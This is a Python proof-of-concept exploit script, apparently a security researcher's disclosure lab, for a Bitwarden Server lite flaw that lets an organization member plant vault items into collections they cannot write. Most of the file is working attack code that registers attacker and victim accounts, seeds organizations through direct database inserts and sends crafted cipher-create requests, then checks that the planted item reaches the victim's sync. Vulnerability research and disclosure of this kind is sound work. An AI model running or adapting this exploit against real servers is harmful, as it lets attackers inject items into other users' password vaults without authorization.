#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: bitwarden-cipher-create-acl (High: 7.1)
#  Vendor: Bitwarden Server (Bitwarden)
#  Versions: Bitwarden Server v2026.9.2 lite EF
#  Impact: plant decryptable vault items into collections the caller cannot write
#  Requires: loopback ghcr.io/bitwarden/lite:2026.9.2 MariaDB org member
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "bitwarden-cipher-create-acl"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: Bitwarden lite EF org cipher create skips collection ACL."""

import base64
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

WITNESS = "BITWARDEN-CIPHER-CREATE-ACL-WITNESS"
LABEL = "BITWARDEN-CIPHER-CREATE-ACL"
BW = os.environ.get("BW_URL", "http://127.0.0.1:18160").rstrip("/")
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "bitwarden-cipher-create-acl")
HERE = os.path.dirname(os.path.abspath(__file__))
DB_NAME = "bitwarden_vault"
DB_USER = "bitwarden"
DB_PASS = "super_strong_password"
ATTACKER_EMAIL = "attacker@lab.invalid"
VICTIM_EMAIL = "victim@lab.invalid"
PASSWORD_HASH = "LabPass123!LabPass123!LabPass123!LabPass123!"
READY_TIMEOUT = int(os.environ.get("BW_READY_TIMEOUT", "1500"))


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def enc_blob(payload: bytes | None = None) -> str:
    iv = base64.b64encode(os.urandom(16)).decode("ascii")
    ct = base64.b64encode(payload if payload is not None else os.urandom(16)).decode("ascii")
    mac = base64.b64encode(os.urandom(32)).decode("ascii")
    return f"2.{iv}|{ct}|{mac}"


def http(
    method: str,
    path: str,
    token: str | None = None,
    payload: dict | None = None,
    form: dict | None = None,
    timeout: int = 60,
    raw_body: bytes | None = None,
    content_type: str | None = None,
) -> tuple[int, str]:
    url = path if path.startswith("http") else f"{BW}{path}"
    headers = {
        "Accept": "application/json",
        "Bitwarden-Client-Version": "2026.9.2",
        "Device-Type": "9",
    }
    data = None
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if form is not None:
        data = urllib.parse.urlencode(form).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    elif raw_body is not None:
        data = raw_body
        if content_type:
            headers["Content-Type"] = content_type
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:
        return 0, str(exc)


def tables_ready() -> bool:
    try:
        raw = mysql("SHOW TABLES;")
    except SystemExit:
        return False
    names = {line.strip().replace("`", "").lower() for line in raw.splitlines() if line.strip()}
    needed = {"user", "organization", "organizationuser", "organizationdomain", "collection", "collectionusers", "collectioncipher", "cipher", "policy"}
    missing = needed - names
    if missing or len(names) < 60:
        log(f"IOC migrate-wait n={len(names)} missing={sorted(missing)}")
        return False
    log(f"IOC migrate-up tables={len(names)}")
    return True


def wait_lite() -> None:
    deadline = time.time() + READY_TIMEOUT
    n = 0
    cfg_body = ""
    cfg_code = 0
    while time.time() < deadline:
        n += 1
        alive_code, _ = http("GET", "/alive", timeout=8)
        cfg_code, cfg_body = http("GET", "/api/config", timeout=8)
        migrated = tables_ready() if (alive_code == 200 or cfg_code == 200) else False
        log(f"IOC lite-wait n={n} alive={alive_code} config={cfg_code} migrated={int(migrated)}")
        if (alive_code == 200 or cfg_code == 200) and migrated:
            log(f"IOC lite-up alive={alive_code} config={cfg_code}")
            return
        time.sleep(5)
    fail(f"lite not ready after {READY_TIMEOUT}s last-config={cfg_code} body={cfg_body[:180]}")


def parse_maybe_json(body: str):
    text = body.strip()
    if not text:
        return None
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return text


def first_ok(method: str, paths: list[str], **kwargs) -> tuple[str, int, str]:
    last = ("", 0, "")
    for path in paths:
        code, body = http(method, path, **kwargs)
        last = (path, code, body)
        log(f"IOC http {method} {path} -> {code}")
        if code not in (0, 404, 502, 503):
            return path, code, body
    return last


def register_user(email: str, name: str) -> None:
    send_code, send_body, send_path = 0, "", ""
    for attempt in range(1, 37):
        send_path, send_code, send_body = first_ok(
            "POST",
            [
                "/identity/accounts/register/send-verification-email",
                "/accounts/register/send-verification-email",
            ],
            payload={"email": email, "name": name, "receiveMarketingEmails": False},
        )
        log(f"IOC register-send email={email} attempt={attempt} path={send_path} http={send_code} body={send_body[:180]}")
        if send_code == 400 and "already taken" in send_body.lower():
            log(f"IOC register-exists email={email}")
            return
        if send_code in (200, 204):
            break
        if send_code in (0, 500, 502, 503):
            time.sleep(5)
            continue
        fail(f"register send-verification-email http={send_code} body={send_body[:300]}")
    else:
        fail(f"register send-verification-email http={send_code} body={send_body[:300]}")
    token_obj = parse_maybe_json(send_body)
    if isinstance(token_obj, str):
        email_token = token_obj.strip().strip('"')
    elif isinstance(token_obj, dict):
        email_token = (
            token_obj.get("token")
            or token_obj.get("emailVerificationToken")
            or token_obj.get("captchaBypassToken")
            or ""
        )
    else:
        email_token = send_body.strip().strip('"')
    if not email_token:
        fail(f"register token empty email={email} body={send_body[:300]}")
    finish = {
        "email": email,
        "emailVerificationToken": email_token,
        "masterPasswordHash": PASSWORD_HASH,
        "userSymmetricKey": enc_blob(),
        "userAsymmetricKeys": {
            "publicKey": base64.b64encode(os.urandom(32)).decode("ascii"),
            "encryptedPrivateKey": enc_blob(),
        },
        "kdf": 0,
        "kdfIterations": 600000,
    }
    finish_base = send_path.rsplit("/register/", 1)[0]
    _, finish_code, finish_body = first_ok(
        "POST",
        [f"{finish_base}/register/finish", "/identity/accounts/register/finish"],
        payload=finish,
    )
    log(f"IOC register-finish email={email} http={finish_code} body={finish_body[:180]}")
    if finish_code not in (200, 201):
        fail(f"register finish http={finish_code} body={finish_body[:400]}")


def token_for(email: str) -> str:
    form = {
        "grant_type": "password",
        "username": email,
        "password": PASSWORD_HASH,
        "scope": "api offline_access",
        "client_id": "web",
        "deviceType": "9",
        "deviceIdentifier": str(uuid.uuid4()),
        "deviceName": "lab",
    }
    _, code, body = first_ok(
        "POST",
        ["/identity/connect/token", "/connect/token"],
        form=form,
    )
    log(f"IOC token email={email} http={code} body={body[:180]}")
    if code != 200:
        fail(f"token http={code} email={email} body={body[:400]}")
    data = parse_maybe_json(body)
    if not isinstance(data, dict) or not data.get("access_token"):
        fail(f"token missing access_token email={email} body={body[:400]}")
    return str(data["access_token"])


def mysql(sql: str, timeout: int = 60) -> str:
    cmd = compose(
        "exec",
        "-T",
        "db",
        "mysql",
        f"-u{DB_USER}",
        f"-p{DB_PASS}",
        "--batch",
        "--raw",
        "--skip-column-names",
        DB_NAME,
        "-e",
        sql,
        timeout=timeout,
    )
    if cmd.returncode != 0:
        alt = compose(
            "exec",
            "-T",
            "db",
            "mariadb",
            f"-u{DB_USER}",
            f"-p{DB_PASS}",
            "--batch",
            "--raw",
            "--skip-column-names",
            DB_NAME,
            "-e",
            sql,
            timeout=timeout,
        )
        if alt.returncode != 0:
            err = (cmd.stderr or "") + "\n" + (alt.stderr or "")
            fail(f"sql failed rc={cmd.returncode}/{alt.returncode} err={err[:500]} sql={sql[:240]}")
        return alt.stdout
    return cmd.stdout


def table_map() -> dict[str, str]:
    raw = mysql("SHOW TABLES;")
    names = [line.strip() for line in raw.splitlines() if line.strip()]
    log(f"IOC tables count={len(names)}")
    wanted = {
        "user": None,
        "organization": None,
        "organizationuser": None,
        "collection": None,
        "collectionusers": None,
        "collectioncipher": None,
        "cipher": None,
    }
    for name in names:
        key = name.replace("`", "").lower()
        if key in wanted and wanted[key] is None:
            wanted[key] = name
    missing = [k for k, v in wanted.items() if not v]
    if missing:
        fail(f"missing tables {missing} have={names[:40]}")
    return wanted  # type: ignore[return-value]


def qident(name: str) -> str:
    return f"`{name.replace('`', '')}`"


def sql_quote(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "''") + "'"


def user_id(tables: dict[str, str], email: str) -> str:
    ut = qident(tables["user"])
    uid = mysql(f"SELECT Id FROM {ut} WHERE Email={sql_quote(email)};").strip()
    if not uid:
        fail(f"user id missing email={email}")
    log(f"IOC user email={email} id={uid}")
    return uid


def seed_orgs(tables: dict[str, str], attacker_id: str, victim_id: str) -> dict[str, str]:
    org_id = str(uuid.uuid4())
    org2_id = str(uuid.uuid4())
    col_a = str(uuid.uuid4())
    col_b = str(uuid.uuid4())
    col_c = str(uuid.uuid4())
    ou_att = str(uuid.uuid4())
    ou_vic = str(uuid.uuid4())
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    ot = qident(tables["organization"])
    out = qident(tables["organizationuser"])
    ct = qident(tables["collection"])
    cut = qident(tables["collectionusers"])

    org_cols = mysql(f"SHOW COLUMNS FROM {ot};")
    col_names = [line.split("\t")[0] for line in org_cols.splitlines() if line.strip()]
    log(f"IOC organization-columns n={len(col_names)}")

    bool_true = {
        "Enabled",
        "SelfHost",
        "UsePasswordManager",
        "UseTotp",
        "UseApi",
        "AllowAdminAccessToAllCollectionItems",
    }
    required_strings = {
        "Name": "Lab Org",
        "BillingEmail": "billing@lab.invalid",
        "Plan": "Teams Annually",
    }
    required_ints = {
        "PlanType": 18,
        "Status": 1,
        "Seats": 10,
        "MaxCollections": 20,
        "MaxStorageGb": 1,
    }

    def org_insert(oid: str, name: str) -> str:
        cols = ["Id"]
        vals = [sql_quote(oid)]
        for col in col_names:
            if col == "Id":
                continue
            if col in required_strings:
                value = sql_quote(name if col == "Name" else required_strings[col])
            elif col in required_ints:
                value = str(required_ints[col])
            elif col in ("CreationDate", "RevisionDate"):
                value = sql_quote(now)
            elif col in bool_true:
                value = "1"
            elif col.endswith("Date") or col in (
                "Gateway",
                "GatewayCustomerId",
                "GatewaySubscriptionId",
                "Identifier",
                "LicenseKey",
                "PrivateKey",
                "PublicKey",
                "ReferenceData",
                "TwoFactorProviders",
                "BusinessName",
                "BusinessAddress1",
                "BusinessAddress2",
                "BusinessAddress3",
                "BusinessCountry",
                "BusinessTaxNumber",
                "Storage",
                "MaxAutoscaleSeats",
                "MaxAutoscaleSmSeats",
                "MaxAutoscaleSmServiceAccounts",
                "SmSeats",
                "SmServiceAccounts",
                "OwnersNotifiedOfAutoscaling",
                "ExpirationDate",
            ):
                value = "NULL"
            else:
                # remaining flags default off
                value = "0"
            cols.append(qident(col).strip("`") if False else col)
            vals.append(value)
        col_sql = ", ".join(qident(c) for c in cols)
        val_sql = ", ".join(vals)
        return f"INSERT INTO {ot} ({col_sql}) VALUES ({val_sql});"

    mysql(org_insert(org_id, "Lab Org One"))
    mysql(org_insert(org2_id, "Lab Org Two"))

    def ou_insert(ouid: str, oid: str, uid: str) -> str:
        return (
            f"INSERT INTO {out} "
            f"(Id, OrganizationId, UserId, Email, `Key`, Status, Type, CreationDate, RevisionDate, "
            f"AccessSecretsManager, AccessPam) VALUES ("
            f"{sql_quote(ouid)}, {sql_quote(oid)}, {sql_quote(uid)}, NULL, {sql_quote(enc_blob())}, "
            f"2, 2, {sql_quote(now)}, {sql_quote(now)}, 0, 0);"
        )

    mysql(ou_insert(ou_att, org_id, attacker_id))
    mysql(ou_insert(ou_vic, org_id, victim_id))

    dummy_name = enc_blob(b"collection")
    mysql(
        f"INSERT INTO {ct} (Id, OrganizationId, Name, CreationDate, RevisionDate, Type) VALUES "
        f"({sql_quote(col_a)}, {sql_quote(org_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0), "
        f"({sql_quote(col_b)}, {sql_quote(org_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0), "
        f"({sql_quote(col_c)}, {sql_quote(org2_id)}, {sql_quote(dummy_name)}, {sql_quote(now)}, {sql_quote(now)}, 0);"
    )
    mysql(
        f"INSERT INTO {cut} (CollectionId, OrganizationUserId, ReadOnly, HidePasswords, Manage) VALUES "
        f"({sql_quote(col_a)}, {sql_quote(ou_att)}, 0, 0, 0), "
        f"({sql_quote(col_b)}, {sql_quote(ou_vic)}, 0, 0, 0);"
    )
    ids = {
        "org": org_id,
        "org2": org2_id,
        "col_a": col_a,
        "col_b": col_b,
        "col_c": col_c,
        "ou_att": ou_att,
        "ou_vic": ou_vic,
    }
    log(
        "IOC seed "
        f"org={org_id} org2={org2_id} colA={col_a} colB={col_b} colC={col_c} "
        f"ou_att={ou_att} ou_vic={ou_vic}"
    )
    return ids


def cipher_body(org_id: str, collection_id: str) -> dict:
    name = enc_blob(b"name")
    notes = enc_blob(WITNESS.encode("ascii"))
    username = enc_blob(WITNESS.encode("ascii"))
    password = enc_blob(b"pass")
    data = json.dumps(
        {
            "Name": name,
            "Notes": notes,
            "Username": username,
            "Password": password,
            "labWitness": WITNESS,
        }
    )
    return {
        "cipher": {
            "type": 1,
            "organizationId": org_id,
            "name": name,
            "notes": notes,
            "login": {"username": username, "password": password},
            "data": data,
        },
        "collectionIds": [collection_id],
    }


def collectioncipher_rows(tables: dict[str, str], collection_id: str) -> list[tuple[str, str]]:
    cct = qident(tables["collectioncipher"])
    raw = mysql(
        f"SELECT CipherId, CollectionId FROM {cct} WHERE CollectionId={sql_quote(collection_id)};"
    )
    rows = []
    for line in raw.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 2:
            rows.append((parts[0], parts[1]))
    return rows


def ids_in_body(body: str, cipher_id: str) -> bool:
    return cipher_id.lower() in body.lower()


def victim_has_cipher(token: str, cipher_id: str) -> bool:
    c_code, c_body = http("GET", "/api/ciphers", token=token)
    s_code, s_body = http("GET", "/api/sync", token=token)
    has_list = c_code == 200 and ids_in_body(c_body, cipher_id)
    has_sync = s_code == 200 and ids_in_body(s_body, cipher_id)
    has_witness = WITNESS in c_body or WITNESS in s_body
    log(
        f"IOC victim-fetch ciphers={c_code} sync={s_code} "
        f"has-id-list={int(has_list)} has-id-sync={int(has_sync)} witness-in-body={int(has_witness)}"
    )
    return has_list or has_sync


def main() -> None:
    wait_lite()
    register_user(ATTACKER_EMAIL, "attacker")
    register_user(VICTIM_EMAIL, "victim")
    att_token = token_for(ATTACKER_EMAIL)
    vic_token = token_for(VICTIM_EMAIL)
    tables = table_map()
    attacker_id = user_id(tables, ATTACKER_EMAIL)
    victim_id = user_id(tables, VICTIM_EMAIL)
    ids = seed_orgs(tables, attacker_id, victim_id)
    att_token = token_for(ATTACKER_EMAIL)
    vic_token = token_for(VICTIM_EMAIL)

    # Negative: attacker is not in org2.
    neg_code, neg_body = http(
        "POST",
        "/api/ciphers/create",
        token=att_token,
        payload=cipher_body(ids["org2"], ids["col_c"]),
    )
    neg_rows = collectioncipher_rows(tables, ids["col_c"])
    log(f"IOC negative-create http={neg_code} body={neg_body[:180]} collectioncipher={len(neg_rows)}")
    if neg_code != 404 or neg_rows:
        fail(
            f"negative expected 404 and no CollectionCipher got http={neg_code} "
            f"rows={len(neg_rows)} body={neg_body[:300]}"
        )

    before = collectioncipher_rows(tables, ids["col_b"])
    create_code, create_body = http(
        "POST",
        "/api/ciphers/create",
        token=att_token,
        payload=cipher_body(ids["org"], ids["col_b"]),
    )
    after = collectioncipher_rows(tables, ids["col_b"])
    log(
        f"IOC create-noaccess http={create_code} body={create_body[:220]} "
        f"collectioncipher-before={len(before)} after={len(after)}"
    )
    if not after:
        fail(
            f"no CollectionCipher row after create http={create_code} body={create_body[:400]}"
        )
    cipher_id = after[0][0]
    victim_ok = victim_has_cipher(vic_token, cipher_id)
    log(
        f"IOC users attacker={ATTACKER_EMAIL} victim={VICTIM_EMAIL} "
        f"org={ids['org']} colA={ids['col_a']} colB={ids['col_b']} "
        f"create-http={create_code} collectioncipher={len(after)} "
        f"victim-sync-has-cipher={'yes' if victim_ok else 'no'} cipher={cipher_id}"
    )
    if not victim_ok:
        fail(f"victim sync missing planted cipher {cipher_id}")
    if create_code not in (200, 404):
        fail(f"unexpected create status {create_code} body={create_body[:300]}")

    # Optional: ReadOnly on B should return 200 and still plant.
    mysql(
        f"INSERT INTO {qident(tables['collectionusers'])} "
        f"(CollectionId, OrganizationUserId, ReadOnly, HidePasswords, Manage) VALUES "
        f"({sql_quote(ids['col_b'])}, {sql_quote(ids['ou_att'])}, 1, 0, 0);"
    )
    ro_code, ro_body = http(
        "POST",
        "/api/ciphers/create",
        token=att_token,
        payload=cipher_body(ids["org"], ids["col_b"]),
    )
    ro_rows = collectioncipher_rows(tables, ids["col_b"])
    ro_id = None
    if ro_code == 200:
        parsed = parse_maybe_json(ro_body)
        if isinstance(parsed, dict):
            ro_id = parsed.get("id") or (parsed.get("cipher") or {}).get("id")
    if not ro_id and len(ro_rows) >= 2:
        planted = {row[0] for row in after}
        for cid, _ in ro_rows:
            if cid not in planted:
                ro_id = cid
                break
    ro_victim = bool(ro_id) and victim_has_cipher(vic_token, str(ro_id))
    log(
        f"IOC readonly-create http={ro_code} collectioncipher={len(ro_rows)} "
        f"readonly-id={ro_id} victim-has={int(ro_victim)}"
    )

    success(
        f"create-http={create_code} collectioncipher={len(after)} "
        f"victim-sync-has-cipher=yes cipher={cipher_id} "
        f"negative-http={neg_code} readonly-http={ro_code}"
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception {type(exc).__name__}: {exc}")

